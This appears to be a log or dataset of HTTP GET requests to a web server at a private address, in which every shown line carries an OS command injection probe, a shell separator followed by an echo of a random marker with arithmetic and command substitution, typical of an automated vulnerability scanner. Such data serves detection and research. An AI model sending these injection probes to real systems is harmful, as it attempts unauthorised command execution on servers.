+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo FBBVQJ$((43+54))$(echo FBBVQJ)FBBVQJ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo MECJPP$((8+46))$(echo MECJPP)MECJPP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo MECJPP$((8+46))$(echo MECJPP)MECJPP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo MECJPP$((8+46))$(echo MECJPP)MECJPP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo MECJPP$((8+46))$(echo MECJPP)MECJPP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JESSAG$((12+14))$(echo JESSAG)JESSAG|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JESSAG$((12+14))$(echo JESSAG)JESSAG|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JESSAG$((12+14))$(echo JESSAG)JESSAG|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JESSAG$((12+14))$(echo JESSAG)JESSAG|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho DCTLPA$((42+32))$(echo DCTLPA)DCTLPA|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho DCTLPA$((42+32))$(echo DCTLPA)DCTLPA|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho DCTLPA$((42+32))$(echo DCTLPA)DCTLPA|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho DCTLPA$((42+32))$(echo DCTLPA)DCTLPA|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho VBUEOP$((82+76))$(echo VBUEOP)VBUEOP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho VBUEOP$((82+76))$(echo VBUEOP)VBUEOP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho VBUEOP$((82+76))$(echo VBUEOP)VBUEOP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho VBUEOP$((82+76))$(echo VBUEOP)VBUEOP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo QSSKYP$((84+12))$(echo QSSKYP)QSSKYP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo QSSKYP$((84+12))$(echo QSSKYP)QSSKYP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo QSSKYP$((84+12))$(echo QSSKYP)QSSKYP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo QSSKYP$((84+12))$(echo QSSKYP)QSSKYP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SPLIVO$((6+99))$(echo SPLIVO)SPLIVO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SPLIVO$((6+99))$(echo SPLIVO)SPLIVO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SPLIVO$((6+99))$(echo SPLIVO)SPLIVO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SPLIVO$((6+99))$(echo SPLIVO)SPLIVO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo DFMUXV$((44+15))$(echo DFMUXV)DFMUXV|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo DFMUXV$((44+15))$(echo DFMUXV)DFMUXV|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo DFMUXV$((44+15))$(echo DFMUXV)DFMUXV|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo DFMUXV$((44+15))$(echo DFMUXV)DFMUXV|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo UFLRHU$((81+84))$(echo UFLRHU)UFLRHU|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo UFLRHU$((81+84))$(echo UFLRHU)UFLRHU|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo UFLRHU$((81+84))$(echo UFLRHU)UFLRHU|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo UFLRHU$((81+84))$(echo UFLRHU)UFLRHU|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VNTYJO$((74+37))$(echo VNTYJO)VNTYJO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VNTYJO$((74+37))$(echo VNTYJO)VNTYJO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VNTYJO$((74+37))$(echo VNTYJO)VNTYJO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VNTYJO$((74+37))$(echo VNTYJO)VNTYJO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo YFSOKY$((70+61))$(echo YFSOKY)YFSOKY|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo YFSOKY$((70+61))$(echo YFSOKY)YFSOKY|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo YFSOKY$((70+61))$(echo YFSOKY)YFSOKY|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo YFSOKY$((70+61))$(echo YFSOKY)YFSOKY|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo KZMUZP$((91+27))$(echo KZMUZP)KZMUZP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo KZMUZP$((91+27))$(echo KZMUZP)KZMUZP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo KZMUZP$((91+27))$(echo KZMUZP)KZMUZP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo KZMUZP$((91+27))$(echo KZMUZP)KZMUZP|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo UKOCBD$((11+71))$(echo UKOCBD)UKOCBD|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo UKOCBD$((11+71))$(echo UKOCBD)UKOCBD|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo UKOCBD$((11+71))$(echo UKOCBD)UKOCBD|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo UKOCBD$((11+71))$(echo UKOCBD)UKOCBD|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CWXAOU$((49+12))$(echo CWXAOU)CWXAOU|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CWXAOU$((49+12))$(echo CWXAOU)CWXAOU|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CWXAOU$((49+12))$(echo CWXAOU)CWXAOU|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CWXAOU$((49+12))$(echo CWXAOU)CWXAOU|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ONYZPK$((84+39))$(echo ONYZPK)ONYZPK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ONYZPK$((84+39))$(echo ONYZPK)ONYZPK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ONYZPK$((84+39))$(echo ONYZPK)ONYZPK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ONYZPK$((84+39))$(echo ONYZPK)ONYZPK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo BKZZTB$((24+89))$(echo BKZZTB)BKZZTB|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo BKZZTB$((24+89))$(echo BKZZTB)BKZZTB|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo BKZZTB$((24+89))$(echo BKZZTB)BKZZTB|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo BKZZTB$((24+89))$(echo BKZZTB)BKZZTB|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo RCYXXD$((17+10))$(echo RCYXXD)RCYXXD|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo RCYXXD$((17+10))$(echo RCYXXD)RCYXXD|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo RCYXXD$((17+10))$(echo RCYXXD)RCYXXD|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo RCYXXD$((17+10))$(echo RCYXXD)RCYXXD|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho LPFLBK$((36+32))$(echo LPFLBK)LPFLBK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho LPFLBK$((36+32))$(echo LPFLBK)LPFLBK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho LPFLBK$((36+32))$(echo LPFLBK)LPFLBK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho LPFLBK$((36+32))$(echo LPFLBK)LPFLBK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho JOALGN$((50+6))$(echo JOALGN)JOALGN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho JOALGN$((50+6))$(echo JOALGN)JOALGN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho JOALGN$((50+6))$(echo JOALGN)JOALGN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho JOALGN$((50+6))$(echo JOALGN)JOALGN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo OTNBRG$((61+40))$(echo OTNBRG)OTNBRG||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo OTNBRG$((61+40))$(echo OTNBRG)OTNBRG||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo OTNBRG$((61+40))$(echo OTNBRG)OTNBRG||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo OTNBRG$((61+40))$(echo OTNBRG)OTNBRG||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo OFPRGN$((67+0))$(echo OFPRGN)OFPRGN||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo OFPRGN$((67+0))$(echo OFPRGN)OFPRGN||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo OFPRGN$((67+0))$(echo OFPRGN)OFPRGN||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo OFPRGN$((67+0))$(echo OFPRGN)OFPRGN||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo JUPQIF$((28+76))$(echo JUPQIF)JUPQIF||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo JUPQIF$((28+76))$(echo JUPQIF)JUPQIF||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo JUPQIF$((28+76))$(echo JUPQIF)JUPQIF||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo JUPQIF$((28+76))$(echo JUPQIF)JUPQIF||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KLPKQM$((73+31))$(echo KLPKQM)KLPKQM||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KLPKQM$((73+31))$(echo KLPKQM)KLPKQM||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KLPKQM$((73+31))$(echo KLPKQM)KLPKQM||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KLPKQM$((73+31))$(echo KLPKQM)KLPKQM||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo BBRJFR$((27+85))$(echo BBRJFR)BBRJFR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo BBRJFR$((27+85))$(echo BBRJFR)BBRJFR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo BBRJFR$((27+85))$(echo BBRJFR)BBRJFR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo BBRJFR$((27+85))$(echo BBRJFR)BBRJFR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo CBZXIX$((95+69))$(echo CBZXIX)CBZXIX||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo GALTGQ$((30+25))$(echo GALTGQ)GALTGQ||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo GALTGQ$((30+25))$(echo GALTGQ)GALTGQ||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo GALTGQ$((30+25))$(echo GALTGQ)GALTGQ||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo GALTGQ$((30+25))$(echo GALTGQ)GALTGQ||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OONNMW$((68+60))$(echo OONNMW)OONNMW||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OONNMW$((68+60))$(echo OONNMW)OONNMW||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OONNMW$((68+60))$(echo OONNMW)OONNMW||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OONNMW$((68+60))$(echo OONNMW)OONNMW||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo DMZDTL$((55+9))$(echo DMZDTL)DMZDTL||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo DMZDTL$((55+9))$(echo DMZDTL)DMZDTL||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo DMZDTL$((55+9))$(echo DMZDTL)DMZDTL||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo DMZDTL$((55+9))$(echo DMZDTL)DMZDTL||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo KHIPMC$((52+52))$(echo KHIPMC)KHIPMC||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo KHIPMC$((52+52))$(echo KHIPMC)KHIPMC||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo KHIPMC$((52+52))$(echo KHIPMC)KHIPMC||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo KHIPMC$((52+52))$(echo KHIPMC)KHIPMC||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QHUEPV$((25+19))$(echo QHUEPV)QHUEPV||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QHUEPV$((25+19))$(echo QHUEPV)QHUEPV||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QHUEPV$((25+19))$(echo QHUEPV)QHUEPV||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QHUEPV$((25+19))$(echo QHUEPV)QHUEPV||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KYTHZK$((50+29))$(echo KYTHZK)KYTHZK||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KYTHZK$((50+29))$(echo KYTHZK)KYTHZK||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KYTHZK$((50+29))$(echo KYTHZK)KYTHZK||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KYTHZK$((50+29))$(echo KYTHZK)KYTHZK||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ADKBES$((71+48))$(echo ADKBES)ADKBES||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ADKBES$((71+48))$(echo ADKBES)ADKBES||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ADKBES$((71+48))$(echo ADKBES)ADKBES||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ADKBES$((71+48))$(echo ADKBES)ADKBES||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho XGAKKW$((46+49))$(echo XGAKKW)XGAKKW||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho XGAKKW$((46+49))$(echo XGAKKW)XGAKKW||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho XGAKKW$((46+49))$(echo XGAKKW)XGAKKW||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho XGAKKW$((46+49))$(echo XGAKKW)XGAKKW||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo LPQWTT$((89+79))$(echo LPQWTT)LPQWTT||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo LPQWTT$((89+79))$(echo LPQWTT)LPQWTT||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo LPQWTT$((89+79))$(echo LPQWTT)LPQWTT||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo LPQWTT$((89+79))$(echo LPQWTT)LPQWTT||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KBYQGP$((86+62))$(echo KBYQGP)KBYQGP||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KBYQGP$((86+62))$(echo KBYQGP)KBYQGP||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KBYQGP$((86+62))$(echo KBYQGP)KBYQGP||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KBYQGP$((86+62))$(echo KBYQGP)KBYQGP||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo TNDMQO$((37+43))$(echo TNDMQO)TNDMQO||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo TNDMQO$((37+43))$(echo TNDMQO)TNDMQO||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo TNDMQO$((37+43))$(echo TNDMQO)TNDMQO||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo TNDMQO$((37+43))$(echo TNDMQO)TNDMQO||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KDVKLC$((31+24))$(echo KDVKLC)KDVKLC||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KDVKLC$((31+24))$(echo KDVKLC)KDVKLC||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KDVKLC$((31+24))$(echo KDVKLC)KDVKLC||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo KDVKLC$((31+24))$(echo KDVKLC)KDVKLC||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo CNIRKG$((0+35))$(echo CNIRKG)CNIRKG||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo CNIRKG$((0+35))$(echo CNIRKG)CNIRKG||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo CNIRKG$((0+35))$(echo CNIRKG)CNIRKG||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo CNIRKG$((0+35))$(echo CNIRKG)CNIRKG||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo WOVERX$((32+51))$(echo WOVERX)WOVERX||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo WOVERX$((32+51))$(echo WOVERX)WOVERX||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo WOVERX$((32+51))$(echo WOVERX)WOVERX||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo WOVERX$((32+51))$(echo WOVERX)WOVERX||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LETMHD$((48+9))$(echo LETMHD)LETMHD||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LETMHD$((48+9))$(echo LETMHD)LETMHD||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LETMHD$((48+9))$(echo LETMHD)LETMHD||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LETMHD$((48+9))$(echo LETMHD)LETMHD||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo WARNZR$((49+27))$(echo WARNZR)WARNZR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo WARNZR$((49+27))$(echo WARNZR)WARNZR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo WARNZR$((49+27))$(echo WARNZR)WARNZR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo WARNZR$((49+27))$(echo WARNZR)WARNZR||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MDDFOK$((8+65))$(echo MDDFOK)MDDFOK||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MDDFOK$((8+65))$(echo MDDFOK)MDDFOK||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MDDFOK$((8+65))$(echo MDDFOK)MDDFOK||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MDDFOK$((8+65))$(echo MDDFOK)MDDFOK||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo RMLUAJ$((85+25))$(echo RMLUAJ)RMLUAJ||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo RMLUAJ$((85+25))$(echo RMLUAJ)RMLUAJ||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo RMLUAJ$((85+25))$(echo RMLUAJ)RMLUAJ||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo RMLUAJ$((85+25))$(echo RMLUAJ)RMLUAJ||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo EXNHRL$((16+83))$(echo EXNHRL)EXNHRL||				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo EXNHRL$((16+83))$(echo EXNHRL)EXNHRL||				/web/
